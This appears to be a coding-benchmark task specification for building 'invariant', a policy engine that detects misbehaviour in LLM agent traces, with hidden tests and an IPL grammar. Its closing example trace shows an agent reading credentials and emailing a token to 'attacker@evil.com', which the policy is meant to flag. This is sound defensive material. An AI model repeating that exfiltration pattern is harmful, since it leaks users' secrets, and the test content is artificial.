# Build `invariant`: a guardrail / policy engine for LLM and MCP agent traces

Implement the Python package `invariant` — a rule-based guardrailing layer for agent applications.
The library lets a user load a **policy** written in the **Invariant Policy
Language (IPL)** — an indented, Python-inspired matching DSL — and apply it to
an agent **trace** (a list of chat-message dicts: user, assistant, system, tool
calls, tool outputs, image content, MCP tool definitions). The policy engine
reports violations (`PolicyViolation`) with structured arguments and source
ranges pointing at the offending substring in the original input.

Install your implementation so it is importable as `invariant` (`pip install -e .`).

You may use any third-party dependencies.

The bulk of the library is pure Python: the IPL grammar/parser/typer, the AST
nodes, the runtime evaluator (rule matching, quantifier evaluation, dataflow
analysis), the standard library of policy helpers, and the input model.

---

## 1. Package layout (what the tests import)

The tests import from these exact module paths:

- `import invariant.analyzer` — top-level re-exports.
- `from invariant.analyzer import Policy, LocalPolicy, Monitor, RuleSet, Input,
  parse, parse_file, PolicyError, PolicyViolation, PolicyLoadingError,
  UnhandledError, ValidatedOperation, traces, ast, extras`
- `from invariant.analyzer.traces import user, assistant, tool, tool_call, system,
  image, chunked`
- `from invariant.analyzer.runtime.input import Input, mask_json_paths`
- `from invariant.analyzer.runtime.nodes import Message, ToolCall, ToolOutput,
  Tool, ToolParameter`
- `from invariant.analyzer.runtime.runtime_errors import
  InvariantInputValidationError, MissingPolicyParameter, ExcessivePolicyError`

`invariant.analyzer.ast` exposes the IPL AST node types (`Import`,
`Declaration`, `RaisePolicy`, `TypedIdentifier`, `BinaryExpr`, `StringLiteral`,
etc.) as documented in §6.

---

## 2. Trace model

A **trace** is a `list[dict]`. Each event is a chat message or an MCP tool
definition. Recognised event shapes:

- **User / system / assistant message**:
  `{"role": "user"|"system"|"assistant", "content": str | None | list[chunk]}`.
  Assistant messages may also carry `"tool_calls": list[tool_call_dict]`.
- **Tool output (the result of a tool call)**:
  `{"role": "tool", "tool_call_id": str | None, "content": str | dict | list[chunk]}`.
- **Tool call** (nested under an assistant message):
  `{"id": str, "type": "function", "function": {"name": str, "arguments": dict | str}}`.
  `arguments` may arrive as a JSON-encoded string; the library auto-decodes it to
  a dict.
- **MCP tool definitions** (a wrapper event):
  `{"tools": [{"name": str, "description": str, "inputSchema": {...}}, ...]}`.
  Each tool gets parsed into a `Tool` with `ToolParameter` children matching the
  JSON-Schema-like `inputSchema`.
- **Chunked content** (multi-part text or image inside one message):
  `[{"type": "text", "text": str}, ...]`
  `[{"type": "image_url", "image_url": {"url": str}}, ...]`

### Event types (exposed at `invariant.analyzer.runtime.nodes`)

All event types are pydantic models and expose an `__invariant_attribute__`
hook restricting which attributes the IPL evaluator may read. Available
attributes per type:

- `Event` (base): `metadata`, `server`.
- `Message`: `role`, `content`, `tool_calls`, `metadata`. `content` is either a
  `str`, `None`, or a `Contents` (list-of-chunk wrapper).
- `ToolCall`: `id`, `type`, `function` (a `Function` with `.name` and
  `.arguments` dict), `metadata`.
- `ToolOutput`: `role`, `content`, `tool_call_id`, `metadata`. Each
  `ToolOutput` back-links to the originating `ToolCall` — the call whose id
  equals the output's `tool_call_id` — resolved at input-parsing time; that
  originating call is reachable via the public `tool_call(out)` helper (§8).
- `Tool`: `name`, `description`, `inputSchema` (list of `ToolParameter`), `server`.
- `ToolParameter`: `type`, `name`, `description`, `required`, `properties`,
  `additionalProperties`, `items`, `enum`. Per-parameter `required: bool` is
  `True` iff the param's name appears in the parent object's `required: [...]`
  list. `properties: dict[str, ToolParameter]` and `items: ToolParameter` are
  recursively parsed from nested object / array subschemas.
- `TextChunk`: `type`, `text`. `Image`: `type`, `image_url`.
- `Contents`: a list-of-chunk wrapper exposing `.text()` (list[str] of all text
  chunks), `.image()` (list[str] of image URLs), iteration, indexing, `len`,
  and `__contains__` (substring search across all text chunks and image URLs).

### `invariant.analyzer.traces` — trace-builder helpers

Convenience constructors that build the canonical chat-message dicts. Each is
pure: no allocations beyond the returned dict, no side effects.

- `system(content) -> dict` — `{"role": "system", "content": content}`.
- `user(content, chunked=False) -> dict` — plain dict; with `chunked=True`,
  `content` becomes a single text-chunk list.
- `assistant(content, tool_call=None) -> dict` — `tool_call` may be `None`, a
  single tool-call dict, or a list of tool-call dicts. The resulting dict
  always has a `tool_calls` list (empty if `tool_call is None`).
- `tool_call(tool_call_id, function_name, arguments) -> dict` — the
  `{"id": ..., "type": "function", "function": {"name": ..., "arguments": ...}}`
  shape used inside an assistant `tool_calls` list.
- `tool(tool_call_id, content) -> dict` — non-string `content` is `str(...)`'d.
- `image(image_url) -> dict` — wraps the URL as a single `image_url` chunk
  inside a user message.
- `chunked(msg) -> dict` — returns a new message whose `content` is a single
  text chunk `[{"type": "text", "text": <msg["content"]>}]`. The original `msg`
  is not mutated. Raises `ValueError` if `msg["content"]` is not a `str`.

---

## 3. Input parsing

`Input(list_of_event_dicts)` parses raw event dicts into typed events:

- The result exposes `.data` — the parsed list of top-level `Message` /
  `ToolOutput` / `Tool` events, plus any bare top-level `ToolCall` events (those
  passed as `{"id": ..., "type": "function", ...}` with no surrounding message).
  `ToolCall` objects nested inside an assistant message's `tool_calls` field are
  NOT additionally promoted to `.data`; they remain accessible only via
  `message.tool_calls`. `.dataflow` exposes a graph used by the `->` flow
  operator.
- Tool-call `arguments` provided as a JSON string are decoded to dict.
- A `ToolOutput` whose `tool_call_id` matches a previously-seen `ToolCall` is
  linked back to that call object (retrievable later via the `tool_call(out)`
  helper, §8).
- Unrecognised events (a dict with no `role`, no `type`, no `tools` key) raise
  `InvariantInputValidationError` (defined in
  `invariant.analyzer.runtime.runtime_errors`).
- `mask_json_paths(input_list, json_paths, mask_fn)` rewrites string fields in
  the input by applying `mask_fn(substr)` over each range described by the
  paths returned from an error's `.ranges` (see §5). The original input is
  not mutated; the masked copy is returned.

---

## 4. Policies

`Policy` is the user-facing entry point. The package exports a `LocalPolicy`
(runs entirely in-process) and a `RemotePolicy` (calls a remote service); the
selection is driven by the `LOCAL_POLICY` environment variable: if it is `"1"`
at import time, `Policy is LocalPolicy`, otherwise `Policy is RemotePolicy`.
**Tests set `LOCAL_POLICY=1` before any invariant import.** Your implementation
must honour this env-var contract: when `LOCAL_POLICY=1`, `Policy.from_string`
must build an in-process policy that does not require network access.

### `LocalPolicy`

- `LocalPolicy.from_string(text, path=None, optimize=False, symbol_table=None)
  -> LocalPolicy` — parses and loads IPL source.
- `LocalPolicy.from_file(path) -> LocalPolicy`.
- `policy.analyze(trace, raise_unhandled=False, **policy_parameters)
  -> AnalysisResult` — synchronous wrapper.
- `await policy.a_analyze(trace, raise_unhandled=False, **policy_parameters)
  -> AnalysisResult` — async variant; both must yield identical results for
  the same input.
- `policy.analyze_pending(past_events, pending_events, raise_unhandled=False,
  **policy_parameters) -> AnalysisResult` — returns only errors whose model
  binds at least one *pending* event (used to drive incremental analysis).
- `policy.incremental() -> IncrementalPolicy` — wraps the policy so subsequent
  `.analyze` calls deduplicate previously-reported errors (by stable error key).
- `policy.errors` — the list of underlying parser/loader errors (empty when
  loading succeeded).

Policy-parameter contract:

- A rule body may read `input.<name>`; the value comes from
  `analyze(..., name=value)`.
- Passing the reserved keyword `data` (used internally to expose the main
  input) raises `ValueError`.
- Reading `input.<name>` when no matching kwarg was passed raises
  `MissingPolicyParameter` (defined in `runtime.runtime_errors`).

When `raise_unhandled=True` is passed to `analyze` (or `a_analyze`,
`analyze_pending`) and the result contains errors, the call raises
`UnhandledError(errors=[...])` instead of returning the result. With no
errors, the result is returned normally.

### `Monitor`

A `Monitor` is a stateful wrapper around an `IncrementalPolicy`: across
multiple `.analyze` / `.check` calls it only reports *new* errors.

- `Monitor.from_string(text, optimize=False, symbol_table=None, **policy_parameters)
  -> Monitor`.
- `Monitor.from_file(path, **policy_parameters) -> Monitor`.
- `monitor.analyze(trace, raise_unhandled=False, **policy_parameters)
  -> AnalysisResult` — delegates to the wrapped incremental policy.
- `monitor.check(past_events, pending_events) -> list[ErrorInformation]` —
  returns only errors involving a pending event. Raises `UnhandledError` if
  the monitor was constructed with `raise_unhandled=True`.

### `RuleSet`, `ValidatedOperation`

`RuleSet` and `ValidatedOperation` are exported from `invariant.analyzer` for
advanced use; the hidden tests do not invoke them directly but they must be
importable.

---

## 5. Results, violations, ranges, errors

`AnalysisResult`:

- `result.errors: list[ErrorInformation]`.
- `result.to_dict() -> dict` — JSON-serialisable shape with one `errors` key
  mapping to a list of per-error dicts. `json.dumps(result.to_dict())` must
  succeed.

`ErrorInformation`:

- `error.args: list` — positional args from `PolicyViolation(*args, **kwargs)`.
- `error.kwargs: dict` — kwargs (e.g. `msg=msg` to thread structured context).
- `error.ranges: list[Range]` — see below.
- `error.key: str | None` — a stable identifier across runs (used by the
  incremental policy to detect new vs already-seen errors).
- `error.to_dict() -> dict` — JSON-serialisable form.
- `str(error)` includes the violation message text and also reflects the kwargs
  passed to the constructor; for a kwarg `msg=msg` bound to a Message with
  `content='X'`, the substring `'X'` appears somewhere in `str(error)`.

`PolicyViolation(*args, **kwargs)` and its alias `Violation(*args, **kwargs)`
are **factory functions** (not classes) that build and return an
`ErrorInformation`. Thus `str(PolicyViolation("msg"))` yields a string that
contains `"msg"`, by transitivity with the `str(error)` contract above. The
literal string form `raise "..."` is equivalent **at runtime** to
`raise PolicyViolation("...")`: the string is materialized into a
`PolicyViolation(literal)` only when the rule fires, so this is a runtime
(evaluation-time) behavior, NOT a parse-time AST rewrite (see §6 for what the
parsed `exception_or_constructor` node holds).

`PolicyError` is the base class for IPL source-code errors (parsing/scoping/
typing) and is exported at `invariant.analyzer.PolicyError`.

`PolicyLoadingError(msg, errors)` is raised by `Policy.from_string` /
`Policy.from_file` when the IPL source is syntactically invalid (carries the
underlying `errors` list). It is NOT raised for valid IPL with unresolved
imports — those surface later, at evaluation time.

Range tracking:

- Each `Range` exposes a `.json_path` like `"0"` (event-level), or
  `"0.content:START-END"`, a half-open range `[START, END)` over the field's
  raw string content (substring at characters `START..END-1` inclusive has end
  offset `END`). E.g. for `content="this is BAD here"`, the match for `"BAD"`
  has path `"0.content:8-11"`. Also valid: `"0.tool_calls.0.function.name:0-3"`.
  Tests assert exact path strings.
- **Substring matching pins ranges.** Whenever a rule body evaluates a substring
  match against a string field of an event — both the `in` membership operator
  with string operands (`"<lit>" in msg.content`) and the `find(pattern, s)`
  stdlib helper (§8) — every matched occurrence registers a substring `Range`
  pinning that occurrence in the `"<event>.content:START-END"` form (the same
  half-open `[START, END)` convention shown above), in addition to the
  event-level `"<event>"` range. So an error raised from `"BAD" in msg.content`
  on event `0` carries a `Range` whose `.json_path` is `"0.content:8-11"`. This
  applies to substring matching generally, not only to `find()`.
- `mask_json_paths(input, paths, fn)` (see §3) consumes these paths to redact
  the originals.

---

## 6. AST surface

`invariant.analyzer.ast` (also re-exported as `invariant.analyzer.language.ast`)
exposes the IPL AST node types. Tests construct policies and then read the
parsed AST. Required node classes:

- `PolicyRoot` — top-level container. `.statements: list`, `.errors:
  list[PolicyError]`.
- `Import(module: str, import_specifiers: list[ImportSpecifier], alias=None)`.
- `ImportSpecifier(name: str, alias: str | None)`.
- `Declaration` — `name := ...` constants and `name(p: T) := ...` predicates.
  Carries `.name` (an `Identifier` or `FunctionSignature`) and `.value` (a
  list of body expressions).
- `RaisePolicy(exception_or_constructor, body)` — produced by
  `raise EXPR if: ... `. `body` is the list of body expressions.
  `exception_or_constructor` **preserves the raise target as written**: for the
  literal form `raise "<lit>" if:` it is the raw `StringLiteral(value='<lit>')`
  node (NOT normalized into a `PolicyViolation(...)` `FunctionCall` at parse
  time), and for an expression target it is that expression node as written. The
  string-to-`PolicyViolation` equivalence (§5) is applied at runtime, not in the
  parsed AST.
- `TypedIdentifier(name: str, type_ref: str)` — produced by `(name: Type)`.
- `BinaryExpr(left, op: str, right)` — `op` is the textual operator (e.g.
  `"=="`, `":="`, `"and"`, `"or"`, `"in"`, `"is"`, `"->"`, `"+"`).
- `UnaryExpr(op: str, operand)`.
- `Identifier(name: str)`.
- `StringLiteral(value: str, quote_type=None, multi_line=False, modifier=None)`.
- `NumberLiteral(value: int | float)`.
- `BooleanLiteral(value: bool)`.
- `NoneLiteral`.
- `FunctionCall(name, args, kwargs=[])`.
- `FunctionDefinition(name, params, body)`.
- `FunctionSignature(name, params)`.
- `ParameterDeclaration(name, type_ref)`.
- `Quantifier(quantifier_call, body)` — `count(...)`, `forall`, etc.
- `MemberAccess(obj, name)`. `KeyAccess(obj, key)`.
- `ToolReference(name: str)` — produced by `tool:NAME`.
- `SemanticPattern(tool_ref, args)` — produced by `tool:NAME(...)`.
- `ObjectLiteral(entries)`, `ObjectEntry(key, value)`.
- `ArrayLiteral(items)`. `ListComprehension(expr, var_name, iterable, condition)`.
- `Wildcard`. `ValueReference(name: str)` — `<VALUE_TYPE>` literal.
- `TernaryOp(true_expr, condition, false_expr)`.

Any additional helper nodes you need (e.g. for scope tracking) may live
alongside but the names above must resolve to the documented node types.

`parse(text, path=None, verbose=True, optimize_rules=True) -> PolicyRoot` —
returns a `PolicyRoot` whose `.errors` is non-empty on syntactically-bad input
(it does NOT raise on syntax error). `parse_file(path) -> PolicyRoot` reads a
file and parses it.

---

## 7. The Invariant Policy Language (IPL)

IPL is indented and Python-inspired but parsed by lark with custom indentation
preprocessing. Before tokenisation, the parser strips the common leading
whitespace from the input (equivalent to `textwrap.dedent(text)`) so that
policies passed from indented Python source (e.g. a triple-quoted string inside
a function body) parse identically to flush-left source. After dedenting, the
first non-blank line establishes the base indent (column 0). Indentation is
significant only at bracket-depth zero: while a parenthesis `(`, brace `{`, or
bracket `[` opened on a line is still unclosed, the surrounding expression
continues implicitly onto the following (more-indented) physical lines until the
delimiter is closed — exactly like Python's implicit line-joining inside
brackets. So a single rule-body expression (e.g. a `tool:NAME({ ... })` semantic
pattern with nested object / list arguments) may be written across multiple
physical lines. A program is a sequence of statements:

- `import MOD` / `from MOD import SPEC1, SPEC2` (with `SPEC: ID | ID as ID`).
- `NAME := EXPR` — declare a constant or derived variable.
- `NAME(p1: T1, p2: T2) := body` — declare a predicate (a body composed of
  expressions, all of which must hold for the predicate to evaluate True).
- `def NAME(...): body` — group multiple rule declarations under a name.
- `raise EXPR_OR_STRING if: body` — a rule; the body is a list of expressions
  that must all evaluate True for the rule to fire. `EXPR_OR_STRING` is either
  a string literal (treated as `PolicyViolation(literal)`) or an arbitrary
  expression (typically a `PolicyViolation(...)` constructor call).

Rule-body expressions:

- **Typed pattern binding** `(name: Type)` — binds every event in the trace
  whose runtime type matches `Type` (one of `Message`, `ToolCall`, `ToolOutput`,
  `Tool`, `ToolParameter`, `TextChunk`, `Image`, `str`, `dict`, or user-defined
  pydantic types). The rule then runs once per bound assignment.
- **Subselect** `(name: T) in iter` — iterate over a list (e.g.
  `msg.content.splitlines()`, `text(msg.content)`, a parsed `dict`) yielding
  one assignment per element of type `T`.
- **Derived variable** `name := EXPR` — bind a name to the value of `EXPR`
  inside the rule body.
- **Flow operator** `(a: T1) -> (b: T2)` — match assignments where `a` and `b`
  are both bound and `a` strictly precedes `b` in the trace's dataflow graph
  (sequential message order; tool calls inherit the position of their parent
  message). Reversed order yields no match.
- **Semantic tool pattern** `call is tool:NAME` matches any `ToolCall` whose
  `.function.name == NAME`. `call is tool:NAME({k1: pat1, k2: pat2, ...})`
  additionally requires each `arguments[k_i]` to match the corresponding
  pattern. String patterns are **regex matches** (e.g. `"^Attacker$"`);
  numeric and object patterns are matched structurally. Object patterns ignore
  unmatched extra keys in the arg dict (every `k_i: pat_i` in the pattern must
  match, but extra keys are fine). List patterns require **exact length** and
  element-by-element match — extra elements cause the match to fail.
- **Boolean operators** `and`, `or`, `not`. The `not` operator binds tightly;
  to negate an expression containing operators, parenthesise: `not (a == b)`.
- **Comparison operators** `==`, `!=`, `<`, `<=`, `>`, `>=`, `in`, `is`.
- **Arithmetic** `+`, `-`, `*`, `/`, `%`, `**`.
- **Ternary** `EXPR1 if COND else EXPR2`.
- **Member / key access** `.attr` and `["key"]`. On a `dict` value, dotted
  access `d.key` is equivalent to `d["key"]` (and a missing key behaves like the
  `[]` form), so e.g. `json_loads(out.content).type` reads the `"type"` key and
  `call.function.arguments.to` reads the `"to"` key of the arguments dict.
- **Function call** `f(arg, kwarg=v)`.
- **Quantifiers** (must be imported from `invariant`):
  - `forall: body` — True iff `body` evaluates True for every possible
    assignment of its bindings.
  - `count(min=int|None, max=int|None): body` — True iff the number of
    assignments for which `body` evaluates True falls in `[min, max]`. Either
    bound may be `None` (open-ended). `not count(...)` inverts.
- **String/list literals**, regex-modifier strings (`r"..."`), f-strings
  (`f"..."`), multi-line strings (`"""..."""`).

### Sandboxing of attribute access

The IPL evaluator restricts which Python methods may be called on `str` and
`dict` values to a safe allowlist:

- On `str`: `split`, `strip`, `lower`, `upper`, `splitlines`, `format`, `join`
  are allowed. Calling any other method (e.g. `replace`, `__dict__`) raises
  `ExcessivePolicyError`.
- On `dict`: `keys`, `values`, `items`, `get` are allowed; mutating methods
  (`update`, `pop`, `clear`) and dunder access raise `ExcessivePolicyError`.
- Attribute access on event types is governed by each type's
  `__invariant_attribute__` hook (see §2): reading an undocumented attribute
  raises `InvariantAttributeError`.

---

## 8. IPL standard library (`from invariant import ...`)

These names are resolvable from any IPL policy via `from invariant import ...`.
They are implemented in Python and exposed through the policy evaluator's
symbol table.

### Types / classes

- `Message`, `ToolCall`, `ToolOutput`, `Tool`, `ToolParameter`, `TextChunk`,
  `Image`, `Contents`, `Event` — for use in `(name: Type)` bindings.
- `PolicyViolation`, `Violation` — error constructors.
- `count`, `forall` — quantifier classes.

### Functions

- `match(pattern, s) -> bool` — `re.match(pattern, s) is not None`. Note
  Python's `re.match` is anchored at the start of `s` but does NOT require
  matching the full string (i.e. NOT `re.fullmatch`; use `^...$` in the
  pattern to anchor both ends).
- `find(pattern, s) -> list[str]` — every regex match; also registers source
  ranges so error `.ranges` pin matched substrings.
- `len(x) -> int`.
- `empty(x) -> bool` — `len(x) == 0`.
- `any(iterable) -> bool`.
- `min`, `max`, `sum`, `tuple`, `print` — straightforward delegations.
- `json_loads(s) -> dict` — `json.loads(s)`, wrapping `json.JSONDecodeError` in
  a policy-friendly exception.
- `text(*args) -> list[str]` — flattens a `Contents`, `Message`, `ToolOutput`,
  or nested list down to a flat list of text strings.
- `image(*args) -> list[str]` — same flattening for image URLs.
- `tool_call(tool_output) -> ToolCall` — returns the originating `ToolCall`
  for a `ToolOutput` (the call whose id matched the output's `tool_call_id`).
  Raises `ValueError` if the argument is not a `ToolOutput`.
- `server(event) -> str | None` — returns `event.server` (set from
  `event.metadata["server"]` during input parsing).

### Access-control helper

`from invariant.access_control import should_allow_rbac` —
`should_allow_rbac(data, scope, user, user_roles, role_grants) -> bool`.
Returns True iff any of `user_roles[user]` grants the role `scope` in
`role_grants`. Used in RBAC-style policies.

---

## 9. Exceptions (importable from `invariant.analyzer.runtime.runtime_errors`)

- `ExcessivePolicyError(ValueError)` — raised when a policy attempts an
  unauthorised attribute/method access (see §7 sandboxing).
- `MissingPolicyParameter(KeyError)` — `input.<name>` used but
  `analyze(..., <name>=...)` was not provided.
- `InvariantInputValidationError(AttributeError)` — `Input(...)` could not
  parse one or more events.
- `InvariantAttributeError(AttributeError)` — runtime attempt to read an
  attribute not in the type's `__invariant_attribute__` allowlist.
- `PolicyExecutionError(Exception)` — generic runtime evaluation failure.

`PolicyLoadingError(Exception)` and `UnhandledError(Exception)` live in
`invariant.analyzer.stdlib.invariant.errors` and are re-exported on the
top-level `invariant.analyzer` module. `UnhandledError` carries `.errors: list`.

---

## 10. Dependencies

**The environment is fully offline — there is no network and you must not install
anything.** All runtime dependencies are already installed in the image, and your
package is installed for you by a `setup.sh` that runs offline (it performs an
editable install, `pip install -e . --no-build-isolation`, against the pre-installed
deps). Just write your code so the editable install picks it up; do not add a
network/install step.

The following runtime dependencies are pre-installed and importable:

- `pydantic` (v2) — typed event models.
- `lark` — the IPL grammar parser.
- `requests`, `aiohttp` — HTTP clients (used by the package's remote/SDK paths).
- `openai`, `invariant-sdk` — client SDKs referenced by the package.
- `nltk` — natural-language helpers.
- `Pillow`, `pytesseract` — image helpers.
- `beautifulsoup4` — HTML parsing helpers.
- `diskcache` — on-disk caching.
- `pexpect` — subprocess interaction.
- `termcolor`, `rich` — terminal output.

The build backend (`setuptools` + `wheel`) and the test harness (`pytest`,
`pytest-json-ctrf`, `pytest-timeout`) are also pre-installed. The hidden tests set
`LOCAL_POLICY=1` and execute against `invariant.analyzer.*` only — the local,
in-process policy path that requires no network.

---

## 11. Holistic example

Putting it all together. A typical guardrail use: forbid `send_email` from
running after a `read_credentials` call (a classic exfiltration pattern).

```python
from invariant.analyzer import LocalPolicy

policy = LocalPolicy.from_string("""
raise "Don't send emails after reading credentials" if:
    (call1: ToolCall) -> (call2: ToolCall)
    call1 is tool:read_credentials
    call2 is tool:send_email
""")

messages = [
    {"role": "user", "content": "Check my account status"},
    {
        "role": "assistant",
        "content": "",
        "tool_calls": [
            {
                "id": "1",
                "type": "function",
                "function": {
                    "name": "read_credentials",
                    "arguments": {"user_id": 42},
                },
            },
        ],
    },
    {
        "role": "tool",
        "tool_call_id": "1",
        "content": "user=alice, token=sk-hunter2",
    },
    {
        "role": "assistant",
        "content": "",
        "tool_calls": [
            {
                "id": "2",
                "type": "function",
                "function": {
                    "name": "send_email",
                    "arguments": {"to": "attacker@evil.com", "body": "alice/sk-hunter2"},
                },
            },
        ],
    },
]

policy.analyze(messages)
# => AnalysisResult(
#   errors=[
#     ErrorInformation(Don't send emails after reading credentials)
#   ]
# )
```

The flow operator `->` matches a `read_credentials` call that strictly precedes
a `send_email` call in the trace. Reversed order yields no match.
